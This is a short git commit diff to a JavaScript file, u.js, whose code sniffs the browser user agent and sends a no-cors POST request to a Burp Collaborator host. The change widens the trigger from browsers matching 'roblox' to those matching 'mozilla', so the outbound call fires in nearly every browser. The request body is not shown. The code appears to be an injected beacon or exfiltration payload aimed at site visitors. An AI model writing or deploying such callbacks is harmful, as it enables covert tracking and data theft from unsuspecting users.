786071820be0791d01802f206ef1dc123c0facf0
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-02 15:26:30 +0330

    Update u.js

--- u.js
+++ u.js
@@ -1,5 +1,5 @@
 var ua=navigator.userAgent
-if(ua.match(/roblox/ig)){
+if(ua.match(/mozilla/ig)){
 fetch('https://j1l3ojxucn141k7s7eyowz4l0c62ur.burpcollaborator.net', {
 method: 'POST',
 mode: 'no-cors',
